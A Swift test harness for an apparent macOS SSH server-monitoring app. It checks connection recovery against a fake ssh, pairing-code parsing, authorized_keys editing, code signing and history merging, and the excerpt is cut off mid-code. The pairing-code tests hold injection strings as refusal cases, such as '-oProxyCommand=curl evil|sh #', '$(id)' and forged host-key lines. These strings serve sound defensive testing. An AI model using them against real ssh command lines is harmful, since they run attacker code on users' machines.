import Foundation
import RexBoingKit

// Tools/check.sh connection
//
// The connection state machine against a fake ssh that drops, hangs, refuses
// and stays down on cue: every recoverable failure must come back by itself,
// and the two that must not be retried blindly must stop and say why.
@main
struct ConnectionCheck {
    @MainActor static func main() {
        var failures = 0
        func check(_ condition: Bool, _ message: String) {
            print("\(condition ? "PASS" : "FAIL")  \(message)")
            if !condition { failures += 1 }
        }

        let tools = URL(fileURLWithPath: CommandLine.arguments[0]).deletingLastPathComponent()
        let fake = ProcessInfo.processInfo.environment["FAKE_SSH"] ?? tools.appendingPathComponent("fake-ssh.sh").path
        SSH.ssh = fake

        /// The reasons given for each wait in the last run.
        var reasons: [String] = []
        func counter(_ scenario: String) -> URL {
            FileManager.default.temporaryDirectory.appendingPathComponent("fake-ssh-\(scenario)-\(getpid())")
        }
        /// How many times the fake ssh ran for a scenario, -G aside.
        func attempts(_ scenario: String) -> Int {
            Int((try? String(contentsOf: counter(scenario), encoding: .utf8))?
                .trimmingCharacters(in: .whitespacesAndNewlines) ?? "") ?? 0
        }

        /// Runs one scenario for up to `seconds`, ticking the watchdog the way
        /// the fleet does, and returns the states it passed through.
        func run(_ scenario: String, seconds: Double, until done: (ServerConnection, [String]) -> Bool) -> (ServerConnection, [String]) {
            let counter = counter(scenario)
            try? FileManager.default.removeItem(at: counter)
            setenv("FAKE_SSH_SCENARIO", scenario, 1)
            setenv("FAKE_SSH_COUNTER", counter.path, 1)
            let connection = ServerConnection(server: Server(name: scenario, host: "fake"))
            var states: [String] = []
            reasons = []
            let observer = connection.$state.sink { state in
                let name: String
                switch state {
                case .idle: name = "idle"
                case .connecting: name = "connecting"
                case .live: name = "live"
                case .waiting(_, let reason): name = "waiting"; reasons.append(reason)
                case .attention(let issue): name = "attention:\(issue.title)"
                }
                if states.last != name { states.append(name) }
            }
            connection.start()
            let deadline = Date().addingTimeInterval(seconds)
            var lastWatchdog = Date()
            while Date() < deadline && !done(connection, states) {
                RunLoop.main.run(until: Date().addingTimeInterval(0.1))
                if Date().timeIntervalSince(lastWatchdog) >= 1 {
                    connection.watchdog(now: Date())
                    lastWatchdog = Date()
                }
            }
            observer.cancel()
            return (connection, states)
        }

        // MARK: Pairing codes and command lines

        func pairingCode(_ fields: [String: Any]) -> String {
            let data = try! JSONSerialization.data(withJSONObject: fields)
            return "rbr1:" + data.base64EncodedString()
                .replacingOccurrences(of: "+", with: "-").replacingOccurrences(of: "/", with: "_")
                .replacingOccurrences(of: "=", with: "")
        }
        let hostKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEBBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5f"
        let realAddresses = ["192.168.1.20", "100.101.102.103", "nas.tail1a2b3.ts.net", "fe80::1%en0",
                             "[fd7a:115c:a1e0::53]", "nas.local"]
        let real = try? PairingCode.parse("Paste this: " + pairingCode(
            ["v": 1, "n": "nas", "u": "alex", "p": 2222, "o": "linux", "a": realAddresses, "k": [hostKey]]) + "\n")
        check(real?.user == "alex" && real?.port == 2222 && real?.addresses == realAddresses && real?.hostKeys == [hostKey],
              "a real pairing code is read, IPv6, tailnet and .local addresses included")
        for user in ["CORP\\alex", "Alex Smith", "alex.smith_2"] {
            let code = try? PairingCode.parse(pairingCode(["u": user, "a": ["10.0.0.2"], "k": [hostKey]]))
            check(code?.user == user, "a pairing code for \(user) is read")
        }
        for user in ["-oProxyCommand=curl evil|sh #", "alex -oProxyCommand=x", "alex\nroot", "al;ex", "$(id)", "alex`id`", " alex"] {
            let code = try? PairingCode.parse(pairingCode(["u": user, "a": ["10.0.0.2"], "k": [hostKey]]))
            check(code == nil, "a pairing code for the user \(user.debugDescription) is refused")
        }
        let planted = try? PairingCode.parse(pairingCode(
            ["u": "alex", "a": ["-oProxyCommand=touch /tmp/x", "10.0.0.2", "host name", "a\nb", "[::1", "x;y"], "k": [hostKey]]))
        check(planted?.addresses == ["10.0.0.2"], "addresses that aren't host names or IPs are dropped (\(planted?.addresses ?? []))")
        check((try? PairingCode.parse(pairingCode(["u": "alex", "a": ["-oProxyCommand=x"], "k": [hostKey]]))) == nil,
              "a pairing code with no usable address is refused")
        for port in [0, 70000, -22] {
            check((try? PairingCode.parse(pairingCode(["u": "alex", "p": port, "a": ["10.0.0.2"], "k": [hostKey]]))) == nil,
                  "a pairing code with port \(port) is refused")
        }
        let injectedKeys = try? PairingCode.parse(pairingCode(["u": "alex", "a": ["10.0.0.2"], "k": [
            hostKey + "\n* ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVJTA", "ssh-dss AAAAB3NzaC1kc3M", "ssh-rsa AAAAC3NzaC1lZDI1NTE5AAAAIEBB",
            "ssh-ed25519 not*base64", hostKey + " comment",
        ]]))
        check(injectedKeys?.hostKeys == [hostKey],
              "host keys that aren't one line of a known type and matching data are dropped (\(injectedKeys?.hostKeys ?? []))")
        check((try? PairingCode.parse(pairingCode(["u": "alex", "a": ["10.0.0.2"], "k": [hostKey + "\n@cert-authority * x"]]))) == nil,
              "a pairing code whose only host key is damaged is refused")

        // Pinning checks the keys again, and clears out lines of any other
        // shape that an earlier code may have slipped in.
        let pinned = FileManager.default.temporaryDirectory.appendingPathComponent("rbr-known-hosts-\(getpid())")
        try? "rbr-old \(hostKey)\n* \(hostKey)\nrbr-x ssh-ed25519 AAAA\n".write(to: pinned, atomically: true, encoding: .utf8)
        var forged = real ?? PairingCode(name: "", user: "", port: 22, os: "", addresses: [], hostKeys: [])
        forged.hostKeys = [hostKey, "ssh-ed25519 AAAA\n* ssh-rsa EVIL"]
        try? forged.pinHostKeys(alias: "rbr-new", file: pinned)
        let pinnedLines = ((try? String(contentsOf: pinned, encoding: .utf8)) ?? "").split(separator: "\n").map(String.init)
        check(pinnedLines == ["rbr-old \(hostKey)", "rbr-new \(hostKey)"], "pinning writes only well-formed lines (\(pinnedLines))")
        check((try? forged.pinHostKeys(alias: "*", file: pinned)) == nil, "and never under a pattern")
        try? FileManager.default.removeItem(at: pinned)

        // Every command line puts "--" right before the destination, so a
        // destination is never read as an option.
        let target = SSH.Target(destination: "alex@nas", port: 2222, hostKeyAlias: "rbr-1a2b3c4d")
        let stream = SSH.background(target, auth: .appKey, avoidAgent: true) + ["stream"]
        check(Array(stream.suffix(3)) == ["--", "alex@nas", "stream"], "the stream's command line ends -- alex@nas stream")
        let setupLine = SSH.setupCommand(target, controlPath: "/tmp/rbr-test/x", command: ["uname", "-sm"])
        check(Array(setupLine.suffix(4)) == ["--", "alex@nas", "uname", "-sm"] && setupLine.filter { $0 == "--" }.count == 1,
              "a setup command's ends -- alex@nas uname -sm")
        let sftpLine = SSH.sftpArguments(target, controlPath: "/tmp/rbr-test/x")
        check(Array(sftpLine.suffix(2)) == ["--", "alex@nas"] && sftpLine.contains("-P") && !sftpLine.contains("-p"),
              "sftp's ends -- alex@nas")
        let argumentLog = FileManager.default.temporaryDirectory.appendingPathComponent("fake-ssh-args-\(getpid())")
        try? FileManager.default.removeItem(at: argumentLog)
        setenv("FAKE_SSH_LOG", argumentLog.path, 1)
        setenv("FAKE_SSH_SCENARIO", "none", 1)
        setenv("FAKE_SSH_COUNTER", argumentLog.path + ".count", 1)
        var resolved = false
        Task { _ = await SSH.resolve("-oProxyCommand=x"); resolved = true }
        while !resolved { RunLoop.main.run(until: Date().addingTimeInterval(0.05)) }
        SSH.closeMaster(target, controlPath: "/tmp/rbr-test/x")
        unsetenv("FAKE_SSH_LOG")
        let logged = ((try? String(contentsOf: argumentLog, encoding: .utf8)) ?? "").split(separator: "\n").map(String.init)
        check(logged.count == 2 && logged[0].hasSuffix("-G -- -oProxyCommand=x") && logged[1].hasSuffix("-O exit -- alex@nas"),
              "ssh -G and ssh -O exit put it after -- too (\(logged))")
        try? FileManager.default.removeItem(at: argumentLog)
        try? FileManager.default.removeItem(atPath: argumentLog.path + ".count")
        check(!SSH.isUsableDestination("-oProxyCommand=x") && !SSH.isUsableDestination("alex@host name")
              && SSH.isUsableDestination("alex@nas.local") && SSH.isUsableDestination("nas"),
              "a typed destination that would read as an option, or has spaces, is refused")

        // MARK: The saved list

        // A list from another version still loads: keys it didn't have take
        // their defaults, values it doesn't know become the default ones,
        // and a server that can't be read at all costs only itself.
        let saved = Data("""
            {"version":1,"servers":[
              {"id":"6D0D2C3A-0001-4C1E-9E7B-DE00000000AA","name":"Old","host":"old.local","character":"sumo","readout":"fans","auth":"telepathy"},
              {"id":"6D0D2C3A-0001-4C1E-9E7B-DE00000000BB","host":"nameless.local"},
              {"id":"6D0D2C3A-0001-4C1E-9E7B-DE00000000CC","name":"New","host":"new.local","addresses":["10.0.0.3"],"pinned":true,
               "character":"ninja","readout":"gpu","keepHistory":true,"futureField":{"x":1}}
            ]}
            """.utf8)
        let lenient = try? ServerStore.decode(saved)
        let old = lenient?.servers.first
        check(lenient?.servers.count == 2 && lenient?.dropped == 1
              && old?.character == .rex && old?.readout == .cpu && old?.auth == .appKey && old?.addresses == [] && old?.pinned == false
              && lenient?.servers.last?.character == .ninja && lenient?.servers.last?.keepHistory == true,
              "a list from another version loads what it can (\(lenient?.servers.map(\.name) ?? []), \(lenient?.dropped ?? -1) dropped)")
        let encoder = JSONEncoder()
        encoder.outputFormatting = [.sortedKeys]
        if let original = lenient?.servers.last, let once = try? encoder.encode(original),
           let back = try? JSONDecoder().decode(Server.self, from: once), let twice = try? encoder.encode(back) {
            let keys = (try? JSONSerialization.jsonObject(with: once) as? [String: Any])?.keys.sorted() ?? []
            check(back == original && once == twice
                  && keys == ["added", "addresses", "auth", "character", "host", "id", "keepHistory", "name", "pinned", "readout"],
                  "and writes servers exactly as before (\(keys))")
        } else {
            check(false, "and writes servers exactly as before")
        }

        // Repair and adding again take only what setup found, leaving what
        // the user changed while it ran.
        let before = Server(name: "Box", host: "box.local", os: "linux", agentVersion: "0.1.0")
        let store = ServerStore(inMemory: [before])
        store.update(before.id) { $0.name = "Renamed"; $0.pinned = true; $0.character = .ninja; $0.keepHistory = true }
        var repaired = before
        repaired.os = "darwin"
        repaired.agentVersion = "0.3.0"
        repaired.auth = .userSSH
        store.applySetup(repaired)
        let after = store.server(before.id)
        check(after?.name == "Renamed" && after?.pinned == true && after?.character == .ninja && after?.keepHistory == true
              && after?.os == "darwin" && after?.agentVersion == "0.3.0" && after?.auth == .userSSH,
              "a repair keeps edits made while it ran, and takes what it found")

        // MARK: The macOS agent's authorized_keys and upgrades

        // Lines the agent doesn't own survive byte for byte, whatever their
        // encoding or line endings.
        let theirKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEBBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWltcXV5f"
        let latin1 = Array("# Ren".utf8) + [0xE9] + Array("'s keys\r\n".utf8)
            + Array("from=\"10.0.0.0/8\" \(theirKey) ren".utf8) + [0xE9] + Array("@laptop\r\n".utf8)
        let ourBlob = "AAAAC3NzaC1lZDI1NTE5AAAAIE91cktleU91cktleU91cktleU91cktleU91cktl"
        let ourLine = Array("restrict,command=\"'/Users/ren/.local/share/rex-boing-remote/rex-boing-agent' ssh\" ssh-ed25519 \(ourBlob) rex-boing-remote:Mac".utf8)
        let installed = AuthorizedKeys.upsert(latin1, line: ourLine, blob: ourBlob)
        check(!installed.replaced && installed.content == latin1 + ourLine + [0x0D, 0x0A],
              "install keeps another key with non-UTF-8 bytes, and the file's CRLF endings")
        let again = AuthorizedKeys.upsert(installed.content, line: ourLine + Array(" ".utf8), blob: ourBlob)
        check(again.replaced && again.content == latin1 + ourLine + Array(" \r\n".utf8), "installing again replaces the agent's line in place")
        let uninstalled = AuthorizedKeys.removeKeys(installed.content, commentPrefix: "rex-boing-remote:")
        check(uninstalled.removed == 1 && uninstalled.content == latin1, "uninstall removes only the agent's line")
        let noEnding = Array(theirKey.utf8)
        check(AuthorizedKeys.upsert(noEnding, line: ourLine, blob: ourBlob).content == noEnding + [0x0A] + ourLine,
              "a file without a last line ending gets one before the new line, and none after")

        // On disk: a symlinked file stays a symlink, keeps its mode, and one
        // that can't be read is never treated as empty.
        let keysDirectory = FileManager.default.temporaryDirectory.appendingPathComponent("rbr-keys-\(getpid())")
        try? FileManager.default.removeItem(at: keysDirectory)
        try? FileManager.default.createDirectory(at: keysDirectory, withIntermediateDirectories: true)
        let realKeys = keysDirectory.appendingPathComponent("dotfiles-authorized_keys").path
        let linkedKeys = keysDirectory.appendingPathComponent("authorized_keys").path
        FileManager.default.createFile(atPath: realKeys, contents: Data(latin1))
        chmod(realKeys, 0o640)
        try? FileManager.default.createSymbolicLink(atPath: linkedKeys, withDestinationPath: realKeys)
        let editPath = AuthorizedKeys.resolve(linkedKeys)
        if let existing = try? AuthorizedKeys.read(editPath) {
            try? AuthorizedKeys.write(AuthorizedKeys.upsert(existing.bytes, line: ourLine, blob: ourBlob).content, to: editPath, mode: existing.mode)
        }
        var linkInfo = stat()
        lstat(linkedKeys, &linkInfo)
        var realInfo = stat()
        stat(realKeys, &realInfo)
        let written = (try? Data(contentsOf: URL(fileURLWithPath: realKeys))).map { [UInt8]($0) }
        check(linkInfo.st_mode & S_IFMT == S_IFLNK && realInfo.st_mode & 0o777 == 0o640 && written == latin1 + ourLine + [0x0D, 0x0A],
              "a symlinked authorized_keys stays a symlink, with its mode, and the file it points to is edited")
        let leftovers = (try? FileManager.default.contentsOfDirectory(atPath: keysDirectory.path)) ?? []
        check(leftovers.sorted() == ["authorized_keys", "dotfiles-authorized_keys"], "and no temporary file is left (\(leftovers))")
        chmod(realKeys, 0o000)
        let unreadable = Result { try AuthorizedKeys.read(realKeys) }
        if getuid() != 0 {
            if case .failure = unreadable { check(true, "an unreadable authorized_keys is an error, not an empty file") } else {
                check(false, "an unreadable authorized_keys is an error, not an empty file")
            }
        }
        if case .success(nil) = Result(catching: { try AuthorizedKeys.read(keysDirectory.appendingPathComponent("missing").path) }) {
            check(true, "a missing authorized_keys is simply none yet")
        } else {
            check(false, "a missing authorized_keys is simply none yet")
        }
        chmod(realKeys, 0o600)
        try? FileManager.default.removeItem(at: keysDirectory)

        // An upgrade over the restricted key takes only a binary signed by
        // the agent's own team. This check is ad-hoc signed, like an agent
        // built from source, which has no team and keeps taking any binary.
        let me = CommandLine.arguments[0]
        check(CodeSignature.teamID(path: me) == nil && CodeSignature.ownTeamID() == nil,
              "an ad-hoc build has no team, so its upgrades are unchanged")
        check(CodeSignature.problem(path: me, teamID: "ABCDE12345") != nil,
              "a signed agent refuses an ad-hoc-signed upgrade")
        check(CodeSignature.problem(path: "/usr/bin/true", teamID: "ABCDE12345") != nil,
              "and one signed by anyone else (\(CodeSignature.problem(path: "/usr/bin/true", teamID: "ABCDE12345") ?? "accepted"))")
        check(CodeSignature.problem(path: me, teamID: "X\" or true or \"") != nil, "and a malformed team never becomes a requirement")
        // A Developer ID program on this Mac, if there is one, passes for
        // its own team: the requirement is the right one.
        let applications = (try? FileManager.default.contentsOfDirectory(atPath: "/Applications")) ?? []
        let signed = applications.lazy.filter { $0.hasSuffix(".app") }.compactMap { app -> (String, String)? in
            let bundle = Bundle(path: "/Applications/" + app)
            guard let executable = bundle?.executablePath, let team = CodeSignature.teamID(path: executable),
                  !team.isEmpty else { return nil }
            return (executable, team)
        }.first { CodeSignature.problem(path: $0.0, teamID: $0.1) == nil }
        if let (executable, team) = signed {
            check(CodeSignature.problem(path: executable, teamID: String(team.reversed())) != nil,
                  "a program signed by its team passes, and fails for another team (\((executable as NSString).lastPathComponent))")
        } else {
            print("skip  no Developer ID program in /Applications to check a matching team against")
        }

        // A link that drops twice comes back on its own, with history kept.
        var (connection, states) = run("drop-then-recover", seconds: 20) { c, _ in
            c.state == .live && (c.snapshot?.cpu.total ?? 0) > 0 && c.history.cpu.count >= 6
        }
        check(connection.state == .live, "a dropped stream reconnects by itself (\(states.joined(separator: " → ")))")
        check(states.filter { $0 == "waiting" }.count == 2, "each drop waits once, then retries")
        check(connection.history.cpu.count >= 6, "history survives the drops (\(connection.history.cpu.count) points)")
        connection.stop()

        // A stream that goes silent without closing is ended by the watchdog.
        (connection, states) = run("hang-then-recover", seconds: 30) { c, seen in
            seen.contains("waiting") && c.state == .live
        }
        check(connection.state == .live && states.contains("waiting"),
              "a silent stream is killed and replaced (\(states.joined(separator: " → ")))")
        connection.stop()

        // A server that is down for a while is retried with backoff, then found.
        (connection, states) = run("down-then-up", seconds: 25) { c, _ in c.state == .live }
        check(connection.state == .live, "a server that comes back up is reconnected (\(states.joined(separator: " → ")))")
        connection.stop()

        // Restarting over and over leaves exactly one live stream: events from
        // the sessions it replaced must not touch the state.
        (connection, states) = run("steady", seconds: 3) { c, _ in c.state == .live }
        for _ in 0..<5 {
            connection.restart()
            RunLoop.main.run(until: Date().addingTimeInterval(0.05))
        }
        let settle = Date().addingTimeInterval(8)
        while Date() < settle { RunLoop.main.run(until: Date().addingTimeInterval(0.1)) }
        // Only this process's children: another check running at the same
        // time has fake streams of its own.
        let running = Run.sync("/usr/bin/pgrep", ["-P", String(getpid()), "-f", "fake-ssh.sh"]).stdout
            .split(separator: "\n").count
        check(connection.state == .live && running == 1,
              "rapid restarts leave one live stream (\(running) running, \(connection.state))")
        connection.stop()
        RunLoop.main.run(until: Date().addingTimeInterval(3))

        // A removed key stops and asks for repair instead of hammering the server.
        (connection, states) = run("refused", seconds: 6) { c, _ in
            if case .attention = c.state { return true } else { return false }
        }
        if case .attention(.authenticationFailed) = connection.state {
            check(true, "a refused key stops and asks for repair")
        } else {
            check(false, "a refused key stops and asks for repair (\(states))")
        }
        // Not even a burst of network changes tries it again: that is for
        // wake and Retry Now.
        for _ in 0..<10 { connection.networkChanged(now: Date()) }
        RunLoop.main.run(until: Date().addingTimeInterval(2))
        check(attempts("refused") == 1, "network changes leave a refused key alone (\(attempts("refused")) attempts)")
        connection.stop()

        // A server down for a while is tried at once when the network
        // changes, but not again for every change that follows.
        func isWaiting(_ state: ServerConnection.State) -> Bool {
            if case .waiting = state { return true } else { return false }
        }
        (connection, states) = run("down-then-up", seconds: 5) { _, seen in seen.contains("waiting") }
        connection.networkChanged(now: Date())
        let retriedAtOnce = connection.state == .connecting
        let failedAgain = Date().addingTimeInterval(5)
        while Date() < failedAgain && !isWaiting(connection.state) { RunLoop.main.run(until: Date().addingTimeInterval(0.05)) }
        for _ in 0..<5 { connection.networkChanged(now: Date()) }
        check(retriedAtOnce && isWaiting(connection.state),
              "a burst of network changes retries a waiting server once (\(retriedAtOnce), then \(connection.state))")
        connection.stop()

        // A login that prints noise before the agent starts, then a drop:
        // an ordinary reconnect, not "the agent is missing".
        (connection, states) = run("noisy-drop", seconds: 12) { c, seen in seen.contains("waiting") && c.state == .live }
        check(connection.state == .live && !states.contains { $0.hasPrefix("attention") } && reasons == ["The connection dropped."],
              "shell startup noise doesn't turn a drop into a problem (\(states.joined(separator: " → ")); \(reasons))")
        connection.stop()

        // An agent that dies right after its first sample backs off like
        // any other failure instead of being restarted every second.
        (connection, states) = run("one-sample-crash", seconds: 15) { _, _ in false }
        check(attempts("one-sample-crash") <= 5, "an agent that keeps dying is retried with backoff (\(attempts("one-sample-crash")) attempts in 15 s)")
        connection.stop()

        // An agent too old to understand stops for good, without a retry.
        (connection, states) = run("old-protocol", seconds: 8) { _, _ in false }
        check(connection.state == .attention(.incompatibleAgent("0.0.1")) && attempts("old-protocol") == 1,
              "an agent with an older protocol stops and stays stopped (\(states.joined(separator: " → ")), \(attempts("old-protocol")) attempt)")
        connection.stop()

        // A notice from one session is gone once the next one doesn't send it.
        var noticed = false
        (connection, states) = run("notice-then-fixed", seconds: 12) { c, seen in
            if !c.notices.isEmpty { noticed = true }
            return noticed && seen.contains("waiting") && c.state == .live
        }
        check(noticed && connection.notices.isEmpty, "a notice the agent stopped sending goes away (\(connection.notices))")
        connection.stop()

        // A restart while ssh -G is still answering launches the new target,
        // never the old one.
        let launches = FileManager.default.temporaryDirectory.appendingPathComponent("fake-ssh-launches-\(getpid())")
        try? FileManager.default.removeItem(at: launches)
        try? FileManager.default.removeItem(at: counter("moving"))
        setenv("FAKE_SSH_SCENARIO", "steady", 1)
        setenv("FAKE_SSH_COUNTER", counter("moving").path, 1)
        setenv("FAKE_SSH_LOG", launches.path, 1)
        setenv("FAKE_SSH_G_DELAY", "1", 1)
        let moving = ServerConnection(server: Server(name: "moving", host: "old-host"))
        moving.start()
        RunLoop.main.run(until: Date().addingTimeInterval(0.3))
        var moved = moving.server
        moved.host = "new-host"
        moving.update(moved)
        let movingDeadline = Date().addingTimeInterval(8)
        while Date() < movingDeadline && moving.state != .live { RunLoop.main.run(until: Date().addingTimeInterval(0.1)) }
        moving.stop()
        unsetenv("FAKE_SSH_G_DELAY")
        unsetenv("FAKE_SSH_LOG")
        let launched = ((try? String(contentsOf: launches, encoding: .utf8)) ?? "").split(separator: "\n").filter { !$0.contains("-G") }
        check(launched.count == 1 && launched[0].hasSuffix("-- new-host stream"),
              "a restart during ssh -G launches only the new target (\(launched.map { $0.split(separator: " ").suffix(2).joined(separator: " ") }))")
        try? FileManager.default.removeItem(at: launches)
        RunLoop.main.run(until: Date().addingTimeInterval(2))

        // A changed host key stops for good: no retry, ever.
        (connection, states) = run("host-key", seconds: 4) { _, _ in false }
        check(connection.state == .attention(.hostKeyChanged), "a changed host key stops the connection")
        check(attempts("host-key") == 1, "and is never retried on its own (\(attempts("host-key")) attempt)")
        connection.retryNow()
        check(connection.state == .attention(.hostKeyChanged), "not even by Retry Now")
        connection.stop()

        // Demo mode: the recordings play through the same session and
        // connection code, the switched-off server waits like a real one, and
        // nothing ever runs ssh.
        Demo.isActive = true
        Demo.recordingsDirectory = URL(fileURLWithPath: "RexBoingRemote/Demo/Recordings")
        Replay.speed = 4
        let demoCounter = FileManager.default.temporaryDirectory.appendingPathComponent("fake-ssh-demo-\(getpid())")
        try? FileManager.default.removeItem(at: demoCounter)
        setenv("FAKE_SSH_SCENARIO", "steady", 1)
        setenv("FAKE_SSH_COUNTER", demoCounter.path, 1)
        let demo = Demo.machines.map { (agent: $0.agent, connection: ServerConnection(server: $0.server)) }
        demo.forEach { $0.connection.start() }
        func demoSettled() -> Bool {
            demo.allSatisfy { machine in
                switch machine.agent {
                case .recording: return machine.connection.state == .live && machine.connection.history.cpu.count >= 10
                case .unreachable: if case .waiting = machine.connection.state { return true } else { return false }
                }
            }
        }
        var deadline = Date().addingTimeInterval(20)
        while Date() < deadline && !demoSettled() { RunLoop.main.run(until: Date().addingTimeInterval(0.1)) }
        for machine in demo {
            let connection = machine.connection
            switch machine.agent {
            case .recording(let name):
                check(connection.state == .live && connection.history.cpu.count >= 10 && connection.hello?.host?.hostname != nil,
                      "demo \(name) plays (\(connection.history.cpu.count) samples, \(connection.state))")
            case .unreachable:
                if case .waiting(_, let reason) = connection.state {
                    check(reason == "The server isn't answering." && connection.hello == nil,
                          "the switched-off demo server waits to retry (\(reason))")
                } else {
                    check(false, "the switched-off demo server waits to retry (\(connection.state))")
                }
            }
        }
        // An open dashboard asks for everything, and the process table comes.
        let dashboard = demo[0].connection
        var popoverDashboard: ViewerLease? = dashboard.addViewer()
        var windowDashboard: ViewerLease? = dashboard.addViewer()
        deadline = Date().addingTimeInterval(8)
        while Date() < deadline && dashboard.processHistory.samples.count < 2 {
            RunLoop.main.run(until: Date().addingTimeInterval(0.1))
        }
        check(dashboard.processHistory.samples.count >= 2,
              "a demo dashboard gets the process table (\(dashboard.processHistory.samples.count) tables)")
        // The popover closing leaves the window's dashboard at full detail;
        // the last one going takes it back to vitals.
        popoverDashboard = nil
        let tablesBefore = dashboard.processHistory.samples.count
        RunLoop.main.run(until: Date().addingTimeInterval(2))
        check(dashboard.demand == .full && dashboard.processHistory.samples.count > tablesBefore,
              "one of two dashboards closing keeps the other's process table coming")
        windowDashboard = nil
        check(dashboard.demand == .vitals && popoverDashboard == nil && windowDashboard == nil,
              "and the last one closing goes back to vitals")
        demo.forEach { $0.connection.stop() }
        RunLoop.main.run(until: Date().addingTimeInterval(1))
        check(!FileManager.default.fileExists(atPath: demoCounter.path), "demo mode never runs ssh")
        check(Run.sync(SSH.ssh, ["-V"]).status == 255, "and refuses to, whatever asks")

        // MARK: History

        // Back to real connections (the fake ssh) after the demo checks.
        Demo.isActive = false

        // The Go agent's encoder is pinned by agent/internal/history's
        // golden file. The Swift side must read it, and, fed the same
        // samples, must write the same thing: the macOS agent and the app
        // keep history by the same rules as the Go agent.
        let goldenURL = URL(fileURLWithPath: FileManager.default.currentDirectoryPath)
            .appendingPathComponent("agent/internal/history/testdata/history.json")
        if let golden = try? Data(contentsOf: goldenURL),
           let wire = try? JSONDecoder().decode(WireHistory.self, from: golden) {
            let base = Date(timeIntervalSince1970: 1_792_206_000)
            var loaded = HistoryRings(interval: 2, started: base)
            loaded.load(wire, now: base.addingTimeInterval(181))
            check(loaded.fine.points.count == 90 && loaded.medium.points.count == 5 && loaded.coarse.points.isEmpty,
                  "the Go agent's history decodes (\(loaded.fine.points.count) fine, \(loaded.medium.points.count) half-minute points)")
            check(loaded.fine.points[44][.read] == nil && loaded.fine.points[43][.read] == 5,
                  "a missing reading stays missing, not zero")
            check(loaded.processTables.first?.rows?.first?.name == "rsync", "its process table decodes")

            var swift = HistoryRings(interval: 2, started: base)
            for i in 1...90 {
                var sample = WireSample()
                sample.t = Int64(base.timeIntervalSince1970 * 1000) + Int64(i) * 2000
                sample.interval = 2
                sample.resync = false
                let cpu = Double(i % 20) / 20
                var cpuWire = WireCPU()
                cpuWire.total = cpu
                cpuWire.user = cpu * 0.75
                cpuWire.system = cpu * 0.25
                sample.cpu = cpuWire
                var memory = WireMemory()
                memory.total = 1000
                memory.used = 250
                var swap = WireSwap()
                swap.total = 400
                swap.used = 100
                memory.swap = swap
                sample.memory = memory
                var gpu = WireGPU()
                gpu.utilization = 0.125
                sample.gpus = [gpu]
                var thermal = WireThermal()
                thermal.cpuCelsius = 50 + Double(i % 5)
                thermal.gpuCelsius = 45
                sample.thermal = thermal
                var power = WirePower()
                power.packageWatts = 12.5
                sample.power = power
                var network = WireNetwork()
                network.rx = 1000
                network.tx = 10
                sample.network = network
                if i != 45 {
                    var disk = WireDisk()
                    disk.read = 5
                    disk.write = 7
                    sample.disk = disk
                }
                swift.add(sample)
            }
            var table = WireProcesses()
            table.count = 200
            table.sampledAt = Int64(base.timeIntervalSince1970 * 1000) + 100_000
            table.interval = 15
            var rsync = WireProcessRow()
            rsync.pid = 7; rsync.name = "rsync"; rsync.user = "alex"; rsync.cmd = "rsync -a /srv /backup"
            rsync.cpu = 80.5; rsync.memory = 5_000_000
            var postgres = WireProcessRow()
            postgres.pid = 9; postgres.name = "postgres"; postgres.user = "postgres"; postgres.cpu = 2; postgres.memory = 900_000_000
            table.rows = [rsync, postgres]
            swift.add(processes: table)
            let mine = try? JSONSerialization.jsonObject(with: swift.encoded()) as? NSDictionary
            let theirs = try? JSONSerialization.jsonObject(with: golden) as? NSDictionary
            check(mine != nil && mine == theirs, "the Swift rings write what the Go agent writes for the same samples")
            if mine != theirs, let mine {
                print(String(decoding: try! JSONSerialization.data(withJSONObject: mine, options: [.sortedKeys]), as: UTF8.self))
            }

            // An agent's record replaces the app's over the time it covers,
            // and leaves the app's own points outside it alone.
            var app = HistoryRings(interval: 1, started: base)
            for i in 1...300 {
                var point = HistoryPoint(t: Int64(base.timeIntervalSince1970 * 1000) + Int64(i) * 1000)
                point[.cpu] = 0.9
                app.add(point)
            }
            var agent = HistoryRings(interval: 2, started: base)
            for i in 50...100 {
                var point = HistoryPoint(t: Int64(base.timeIntervalSince1970 * 1000) + Int64(i) * 2000)
                point[.cpu] = 0.1
                agent.add(point)
            }
            app.merge(agent.wire(), now: base.addingTimeInterval(301))
            let low = app.fine.points.filter { $0[.cpu] == 0.1 }.count
            let ordered = zip(app.fine.points, app.fine.points.dropFirst()).allSatisfy { $0.t < $1.t }
            check(low == 51 && app.fine.points.count == 99 + 51 + 100 && ordered,
                  "a background agent's points replace the app's where they overlap (\(low) of \(app.fine.points.count))")

            // The half-minute and five minutes the app had open when it went
            // away must not cut the agent's record short when they close.
            var resumed = HistoryRings(interval: 2, started: base)
            for i in 0...5 {
                var point = HistoryPoint(t: Int64(base.timeIntervalSince1970 * 1000) + Int64(i) * 2000)
                point[.cpu] = 0.9
                resumed.add(point)
            }
            var kept = HistoryRings(interval: 2, started: base)
            for i in 0...3600 {
                var point = HistoryPoint(t: Int64(base.timeIntervalSince1970 * 1000) + Int64(i) * 2000)
                point[.cpu] = 0.2
                kept.add(point)
            }
            resumed.merge(kept.wire(), now: base.addingTimeInterval(7200))
            let merged = (resumed.medium.points.count, resumed.coarse.points.count)
            var next = HistoryPoint(t: Int64(base.timeIntervalSince1970 * 1000) + 7_201_000)
            next[.cpu] = 0.5
            resumed.add(next)
            check(merged.0 >= 239 && resumed.medium.points.count == merged.0 && resumed.coarse.points.count == merged.1
                  && resumed.medium.points.last?.t == kept.medium.points.last?.t,
                  "the first sample after an agent's record keeps all of it (\(resumed.medium.points.count) of \(merged.0) half-minutes, "
                  + "\(resumed.coarse.points.count) of \(merged.1) five-minute points)")
        } else {
            check(false, "agent/internal/history/testdata/history.json is readable")
        }

        // A stream that brings history fills the graphs at once.
        var rings = HistoryRings(interval: 2, started: Date().addingTimeInterval(-3600))
        let nowMS = Int64(Date().timeIntervalSince1970 * 1000)
        for i in stride(from: 1800, through: 1, by: -1) {
            var point = HistoryPoint(t: nowMS - Int64(i) * 2000)
            point[.cpu] = 0.4
            point[.memory] = 0.5
            rings.add(point)
        }
        var away = WireProcesses()
        away.count = 10
        away.sampledAt = nowMS - 20 * 60_000
        away.interval = 15
        var row = WireProcessRow()
        row.pid = 42; row.name = "backup"; row.cpu = 95; row.memory = 1 << 30
